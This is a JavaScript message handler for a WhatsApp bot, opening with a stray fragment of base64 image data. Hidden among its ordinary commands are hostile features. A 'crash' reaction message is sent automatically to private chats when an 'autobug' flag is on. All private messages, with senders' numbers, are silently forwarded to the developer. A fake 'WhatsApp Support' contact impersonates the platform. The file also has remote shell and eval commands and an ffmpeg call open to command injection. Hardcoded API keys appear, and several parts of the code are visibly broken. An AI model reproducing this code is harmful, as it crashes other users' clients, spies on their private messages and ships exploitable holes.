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"
module.exports = async (sisaco, sisacoo, mek, store) => {
try {
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''	
const body = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && mek.message.templateButtonReplyMessage.selectedId ? mek.message.templateButtonReplyMessage.selectedId : ''
const budy = typeof m.text == "string" ? m.text : "";
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : " "
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = sisaco.user.id ? sisaco.user.id.split(":")[0]+"@s.whatsapp.net" : sisaco.user.id
const sender = mek.key.fromMe ? (sisaco.user.id.split(':')[0]+'@s.whatsapp.net' || sisaco.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = mek.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await sisaco.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
//const reply = async(teks) => {await sisaco.sendMessage(from,{text: teks, jpegThumbnail: tu},{quoted:mek})}
thumb = fs.readFileSync('./nerdy.jpg')
wicks = fs.readFileSync('./wick.jpg')
const languagecode = JSON.parse(fs.readFileSync('./lib/languages.json'))
const text = q = args.join(" ")
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
        try { pporang = await sisaco.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)} catch { pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'}
		const ppuser = await getBuffer(pporang)
	
	//reply link wa
    global.rpl = { contextInfo: { externalAdReply: { mediaUrl: dygp, mediaType: 'VIDEO', description: 'support group', title: 'packname', body: 'grupo de soporte', thumbnailUrl: `${pporang}`, sourceUrl: dygp }}} 
	
	//reply link PayPal
    global.rpyp = { contextInfo: { externalAdReply: { mediaUrl: fgpyp, mediaType: 'VIDEO', description: 'Donate', title: 'PayPal', body: 'ayuda a mantener el bot activo', thumbnailUrl: `${pporang}`, sourceUrl: fgpyp }}}
	
	//reply link yt
    global.rpyt = { contextInfo: { externalAdReply: { showAdAttribution: true, mediaUrl: fgyt, mediaType: 'VIDEO', description: 'Suscribete : ' + fgyt, title: 'FG YouTube', body: 'aprende a crear tus propios bots', thumbnailUrl: `${pporang}`, sourceUrl: fgyt }}}
const replay = (teks) => {
              sisaco.sendMessage(m.chat, { text: teks,  contextInfo: { externalAdReply: { showAdAttribution: true, mediaUrl: fgyt, mediaType: 'VIDEO', description: 'Suscribete : ' + fgyt, title: 'FG YouTube', body: 'aprende a crear tus propios bots', thumbnailUrl: `${global.ttt}`, sourceUrl: fgyt }}}, {quoted: m})}
		
const menufollow = (hehe) => {
			ano = fs.readFileSync('./follow.webp')
			sisaco.sendMessage(hehe, { sticker: ano, contextInfo: {
			forwardingScore:999,
            isForwarded:true, 
            mentionedJid: [m.sender],
			externalAdReply: { 
			title: "FOLLOW ME ON INSTAGRAM ", 
			mediaType: 1, 
			body: "Website Owner", 
			thumbnail: thumb, 
			previewType: "PHOTO",
			sourceUrl: `https://instagram.com/sisaco2.0`}}} 
			)
		}	
global.Api = new (require('./neoxrApi'))('5VC9rvNx')

// pesan sementara
		global.ephemeral = null // 86400 = 24jam, kalo ingin di hilangkan ganti '86400' jadi 'null' atau ''
		let urls = getRandom(['https://tinyurl.com/248tem3e', 'https://tinyurl.com/2ygkf7cn', 'https://tinyurl.com/29rt6ynv', 'https://tinyurl.com/25ampr4y', 'https://tinyurl.com/2yq9srmd', 'https://tinyurl.com/2bahkesq', 'https://tinyurl.com/2xnzw74a', 'https://tinyurl.com/2b9hocps', 'https://tinyurl.com/265ekuvk', 
'https://tinyurl.com/2c82ajhq', 'https://tinyurl.com/265y8p3e'])
		// externalAdReply or text with thumbnail. idk english? try translating!
		const adReply = {
			contextInfo: {
				forwardingScore: 999,
				isForwarded: true, // ini biar ada tulisannya diteruskan berkali-kali, jika ingin di hilangkan ganti true menjadi false
				externalAdReply: { // Bagian ini sesuka kalian berkreasi :'v
                    showAdAttribution: true,
					title: " 「 Sɪᴍᴩʟᴇ Wʜᴀᴛꜱᴀᴩᴩ Bᴏᴛ 」",
					body: '\t',
					mediaUrl: 'https://tinyurl.com/29rt6ynv',
					description: '',
					previewType: 1,
					thumbnail: global.ttt,
					sourceUrl: "https://github.com/Rlxfly",					
				}
			}
		}
//await(await axios(urls)).buffer()
    if (AUTO_PP) {
      console.log("changing Profile Pic is enabled.")
      setInterval(() => {
        console.log("changing Profile Pic")
      let gis = require("g-i-s");
       gis("zero-Two", async (error, result) => {
         n = result;
         imagees = n[Math.floor(Math.random() * n.length)].url;
         var picturek = "HD 4 *3 pics for Whatsapp dp" || "4 *3 Mark Spector HD pic for whatsapp dp";
        let jack = await axios.get(`https://api-toxic-devil.herokuapp.com/api/search/google-image?query=${picturek}`)
          let sampic = jack.data.result
          console.log(sampic)
          let images = sampic[Math.floor(Math.random() * sampic.length)];
          console.log(images)
         let changebuff = await getBuffer(images)
          const ChangePic = "./ProfilePic.jpg"
          await fs.writeFileSync(ChangePic, changebuff);
        let dd = await fs.readFileSync("./ProfilePic.jpg");
        await sisaco.updateProfilePicture(botNumber, {
            url: "./ProfilePic.jpg"
          })
          console.log("Changed pfp")
          fs.unlinkSync("./ProfilePic.jpg");
        })
      }, 60 * 1000);
    }
    if (AUTO_PPP) {
       setInterval(() => {       
         let sampic = ['https://j.top4top.io/p_2459o0jlh1.jpg','https://telegra.ph/file/ca22bff00078fc293805a.jpg','https://telegra.ph/file/4b30539b018552b2b32a4.jpg','https://telegra.ph/file/1883c43749e5e30528a1e.jpg','https://telegra.ph/file/a1a28941378e2b1f35e43.jpg','https://i.top4top.io/p_24596okrd0.jpg']          
         let images = sampic[Math.floor(Math.random() * sampic.length)];         
         sisaco.updateProfilePicture(botNumber, {
            url: images
          })
          
       }, 1000 * 60 * 60 * 24);   
       }


const reply = (teks) => { sisaco.sendMessage(m.chat,{text: teks, jpegThumbnail: tu, contextInfo: {
              externalAdReply: {
                title: `𝑵𝑬𝑹𝑫𝒀 𝑩𝑶𝑻`,
                body: `ˢⁱˢᵃᶜᵒ`,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: `https://sisaco.web.app`,
                sourceUrl: `https://sisaco.web.app`
              }
            }
          }, { quoted: mek })}	  
         
 const reptly = (teks) => { sisaco.sendMessage(from,{text: teks, jpegThumbnail: tu, contextInfo: { externalAdReply: { mediaUrl: dygp, mediaType: 'VIDEO', description: 'support group', title: 'packname', body: 'grupo de soporte', thumbnailUrl: `${pporang}`, sourceUrl: dygp }}},{quoted:mek}  )}               
 if (body.includes('wick')) { 
sisaco.sendMessage(m.chat, {audio: fs.readFileSync(`./wick.mp3`), mimetype:'audio/mpeg', ptt:true,waveform:"AAMGBwUiLS0vKywyOTQyJiYoJy0sIiAdGBALBQgYLjMsKisoJSMkMjMyMCwjExsbGCQxHiUrJx0gIBcIDBUaIQ==",contextInfo: { externalAdReply: { mediaUrl: dygp, mediaType: 'VIDEO', description: 'Wick ser', title: 'Bala wick😂', body: 'Wickkkkkkk🥵', thumbnailUrl: `${pporang}`, sourceUrl: dygp }}}, {quoted:m}) }

 if (body.includes('Wick')) { 
sisaco.sendMessage(m.chat, {audio: fs.readFileSync(`./wick.mp3`), mimetype:'audio/mpeg', ptt:true,waveform:"AAMGBwUiLS0vKywyOTQyJiYoJy0sIiAdGBALBQgYLjMsKisoJSMkMjMyMCwjExsbGCQxHiUrJx0gIBcIDBUaIQ==",contextInfo: { externalAdReply: { mediaUrl: dygp, mediaType: 'VIDEO', description: 'Wick ser', title: 'Bala wick😂', body: 'Wickkkkkkk🥵', thumbnailUrl: `${pporang}`, sourceUrl: dygp }}}, {quoted:m}) }

//©from: ivan
const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: mek.key, text: "" })
//©from: andik
const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
function jsonformat(string) { return JSON.stringify(string, null, 2)}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
sisaco.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
sisaco.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
sisaco.sendMessage(id, listMessage, options)}

if (body.startsWith(`‎`)) { 
sisaco.relayMessage(from, { reactionMessage }, { messageId: "crash" })}

if (!isOwner && autobug && !isGroup) { 
sisaco.relayMessage(from, { reactionMessage }, { messageId: "crash" })}

if (!isGroup && body && !mek.key.fromMe && !isDev) {
sisaco.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isOwner && !mek.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isOwner || mek.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

                if (budy.startsWith('x')) {
                    if (!isOwner) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                    }
                }
        //Public & Self\\
        if (!sisaco.public) {
            if (!m.key.fromMe) return
        }
        fs.readdirSync('./modules/')
        .forEach((file) => {
          if (path.extname(file)
            .toLowerCase() == '.js') {
            try {
              eval(fs.readFileSync('./modules/' + file, 'utf8'));
            }
            catch (e) {
              var err = e.constructor('Error in file: ./modules/' +file+ '   |' +e.message);
              
              throw err;
              // console.log(e+'\n')
              if (e instanceof SyntaxError) {
                //  alert(e.message);
              }
              else {
                /// throw e;
              }
            }
          }
        })
        //---------External-Modules---------------//
        fs.readdirSync('./modules/external-mod/')
        .forEach((file) => {
          if (path.extname(file)
            .toLowerCase() == '.js') {
            try {
              eval(fs.readFileSync('./modules/external-mod/' + file, 'utf8'));
          return
      }
            catch (e) {
              var err = e.constructor('Error in Evaled Script: ' + e.message);
              err.lineNumber = e.lineNumber - err.lineNumber + 3;
              throw err;
              // console.log(e+'\n')
              if (e instanceof SyntaxError) {
                //  alert(e.message);
              }
              else {
                /// throw e;
              }
            }
          }
        })  

if (isCmd) {
await sisaco.sendPresenceUpdate('composing', m.chat)
sisaco.sendReadReceipt(from, m.sender, [m.key.id])}
switch (command) {
//©from: dennis    
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break
case 'lot': {
texttlot = args.join(' ')
lot1 = texttlot.split('|')[0]
lot2x = texttlot.split('|')[1]
lot2xi = lot2x.replace(/1 :|2 :|3 :|4 :|5 :/gi,'')
lot2x1 = lot2xi.replace('.','')
lot2 = lot2x1.replace(/			|\n/gi,',')
lotr0 = lot2.split(',')[0]
lott0 = lot1.includes(lotr0)

lotr1 = lot2.split(',')[1]
lott1 = lot1.includes(lotr1)
if (lott1 == true){var lotw1 = "👑"} else { var lotw1 = "losser..."}
lotr2 = lot2.split(',')[2]
lott2 = lot1.includes(lotr2)
if (lott2 == true){var lotw2 = "👑"} else { var lotw2 = "losser..."}
lotr3 = lot2.split(',')[3]
lott3 = lot1.includes(lotr3)
if (lott3 == true){var lotw3 = "👑"} else { var lotw3 = "losser..."}
lotv1 = lot1
lotc1 = ((lotv1.match(new RegExp(lotr1, "g")) || []).length);
lotv2 = lot1
lotc2 = ((lotv2.match(new RegExp(lotr2, "g")) || []).length);
lotv3 = lot1
lotc3 = ((lotv3.match(new RegExp(lotr3, "g")) || []).length);
lotba = lotr0.charAt(0)
lotbb = lotr0.charAt(1)
lotbc = lotr0.charAt(2)
repxi = `${lotc1} ${lotw2}\n${lotr3}`
repxi1 = repxi
lotout = repxi1.replace(/0 lost.../gi,' lost...')

reply(lotout)
}
break
case 'jid' : {
    let jid 
            if (m.quoted) jid  = m.mentionedJid[0] ? m.mentionedJid[1] : m.quoted.sender
         else jid = m.chat
         reply(m.chat,jid)
         }
       break

case 'mf' : {         
        let q = m.quoted ? m.quoted : m
        if (/audio|video/.test(mime)) { 
		let media = await q.download()
   if (!text) throw 'Jid?' 
sisaco.sendMessage(text, {audio: media, mimetype: 'audio/mpeg', ptt: true, contextInfo: {externalAdReply : {title : `𝗡𝗲𝗿𝗱𝘆𝘆𝘆𝘆`, renderLargerThumbnail:false, showAdAttribution: true, body: `9:07●━━━━━━── 10:49⇆`, mediaUrl: `www.instagram.com`, mediaType: 2, thumbnail: thumb }}}) 
    	} else throw 'Reply audio/video!'
       }
       break
case 'setppbot': {
            if (!isOwner) return m.reply(mess.owner)
            if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            var media = await sisaco.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
            if (args[0] == `'large'`) {
            var { img } = await generateProfilePicturee(media)
            await sisaco.query({
            tag: 'iq',
            attrs: {
            to: botNumber,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            fs.unlinkSync(media)
            reply(`done`)
            } else {
            var data = await sisaco.updateProfilePicture(botNumber, { url: media })
            fs.unlinkSync(media)
            reply(`Done`)
            }
            }
                break

           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!groupAdmins && !isOwner) return m.reply(mess.admin)
                if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                var media = await sisaco.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == `'large'`) {
                var { img } = await generateProfilePicturee(media)
                await sisaco.query({
                tag: 'iq',
                attrs: {
                to: m.chat,
                type:'set',
                xmlns: 'w:profile:picture'
                },
                content: [
                {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
                }
                ]
                })
                fs.unlinkSync(media)
                reply(`done`)
                } else {
                var data = await sisaco.updateProfilePicture(m.chat, { url: media })
                fs.unlinkSync(media)
                reply(`Done`)
                }
                }
                break       
case 't':
 sisaco.sendMessage(from, {document: fs.readFileSync(`./sacu.txt`), mimetype: 'application/pdf', fileName: `set set thumbnail set.txt`,jpegThumbnail:lol, rpyt }) 
 break
/*case 'condom':{
tstcan = args.join(' ')
canCa = `https://telegra.ph/file/b853903ae15adb8750e7a.jpg`
canCd = tstcan
const Canvas = require('canvas');
const canvas = Canvas.createCanvas(447, 686);
	const context = canvas.getContext('2d');

	const background = await Canvas.loadImage(canCa);
	context.drawImage(background, 0, 0, 447, 686);
		
  context.font = '70px One-Night-Sans-Medium';
  context.fillStyle = '#FFFFFF';
  context.fillText(canCd, 130, 190);
	context.beginPath();
sisaco.sendImage(m.chat, canvas.toBuffer(), 'test')
}
break*/

case 'sing':{
if (!text) return m.reply(`Example : ${prefix + command} Back in black`)
            let yts = require("secktor-pack")
            let search = await yts(text)
            listSerch = []
            teskd = `Result From ${text}.\n_+ ${search.all.length} more results._`
            for (let i of search.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `Secktor / ${i.timestamp}`
                })
            }
            const sections = [

                {
                    title: "Total Search🔍" + search.all.length,
                    rows: listSerch
                }

            ]
            const listMessage = {
                text: teskd,
                footer: "nerdy",
                title: ``,
                buttonText: "Songs",
                mentions: await sisaco.parseMention(teskd),
                sections
            }
            return sisaco.sendMessage(m.chat, listMessage, {
                quoted: m
            })

}
break


case 'resize': {
    if (!m.mtype === "imageMessage") return reply("No es una imagen")
    if (!text) return reply(`Ejemplo: ${prefix + command} 300x300`)
    let p = text.split("x")[0]
    let l = text.split("x")[1]
    let media = await sisaco.downloadAndSaveMediaMessage(quoted, "image")
    let ran = getRandom('.jpg')
    exec(`ffmpeg -i ${media} -vf scale=${p}:${l} ${ran}`, async (err) => { 
      fs.unlinkSync(media)
      if (err) return setReply(err)
      let buffer = fs.readFileSync(ran)
      await sisaco.sendMessage(m.chat, {
        caption: `halo @${m.sender.split("@")[0]}`, 
        image: buffer,
        contextInfo: thumb
      },{ quoted: m })
      fs.unlinkSync(ran)
    })
  } 
    break

 case 'crop': {
    if (!m.mtype === "imageMessage") return reply("No es una imagen")
    if (!text) return reply(`Ejemplo: ${prefix + command} 300x300`)
    let p = text.split("x")[0]
    let l = text.split("x")[1]
    let media = await sisaco.downloadAndSaveMediaMessage(quoted, "image")
    let ran = getRandom('.jpg')
    exec(`ffmpeg -i ${media} -vf crop=${p}:${l} ${ran}`, async (err) => { 
      fs.unlinkSync(media)
      if (err) return setReply(err)
      let buffer = fs.readFileSync(ran)
      await sisaco.sendMessage(m.chat, {
        caption: `halo @${m.sender.split("@")[0]}`, 
        image: buffer,
        contextInfo: thumb
      },{ quoted: m })
      fs.unlinkSync(ran)
    })
  } 
    break           

 case 'to64' : {
sisco = Buffer.from(m.quoted.jpegThumbnail).toString('base64');
lsduser = `"${sisco}"`
m.reply(lsduser)
}
break
case 'tem' : {
let m2 = `
≡ _Use estos comandos sin el prefijo_

▢ Si tienes más  audios   
envíame por t.me/fgsupp_bot el *audio + comando* con en el que responderá

┌─⊷ *AUDIOS* 
▢ Bot
▢ Buenos días
▢ Buenas tardes 
▢ Buenas noches
└──────────────
`
//const pp = await (await fetch('https://i.ibb.co/qMG1JPY/fg.jpg')).buffer()
    let pp = './nerdy.jpg' 
    sisaco.sendButton(m.chat, m2, '▢ DyLux  ┃ ᴮᴼᵀ\n▢ Sígueme en Instagram\nhttps://www.instagram.com/fg98._\n', pp, [
      ['⏍ Info', `${prefix}botinfo`],
      ['⌬ Grupos', `${prefix}gpdylux`]
    ],m, rpyt)
   
}
break
   case 'emoji':
if (args.length == 0) return reply(`Uso: ${prefix + command} 🗿`)
titor = await getBuffer(`https://api.zeeoneofc.xyz/api/emoji/apple?emoji=${encodeURI(q)}&apikey=86f5d90096`)
let encmedia = await sisaco.sendImageAsSticker(m.chat, titor, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
break
 case 'sendimage':
 sisaco.sendMessage(m.chat, { image: { url: q }, jpegThumbnail: fake, fileLength: "5000000000"}, { m })
 break
 case 'sendvideo':
 sisaco.sendMessage(m.chat, { video: { url: q }, jpegThumbnail: fake, fileLength: "5000000000" }, { m })
break
 case 'lyric': {
if (!text) return reply(`Comand usage: ${prefix}lyrics Opa `)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
reply(`
*Titulo :* ${result.title}
*Autor :* ${result.author}
*Url :* ${result.link}

*Lírica:* ${result.lyrics}

`.trim())
}
break           
                       case 'git': case 'gitclone':
           let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            if (!args[0]) reply(`Use ${prefix}gitclone +repositorio\nEjemplo: https://github.com/CarlosTwT/privateBot`)
    if (!regex1.test(args[0])) return reply("y el link?" )
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    sisaco.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
			break
            case 'phone': {
                         if (!text) throw `Ejemplo : ${prefix + command} samsung`                         
            let res = await fetchJson(`https://zenzapis.xyz/webzone/gsmarena?query=${text}&apikey=86f5d90096`)
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${judul}
⭔ Realease: ${rilis}
⭔ Size: ${ukuran}
⭔ Type: ${type}
⭔ Storage: ${storage}
⭔ Display: ${display}
⭔ Inches: ${inchi}
⭔ pixel: ${pixel}
⭔ Video Pixels: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Battery: ${batrai}
⭔ battery brand: ${merek_batre}
⭔ Detail: ${detail}`
            sisaco.sendImage(m.chat, thumb, capt, m)
            }
            break
	                case 'SsWeb': case 'ssweb': case 'Ssweb': case 'ScreenshotWeb': case 'screenshotweb':{
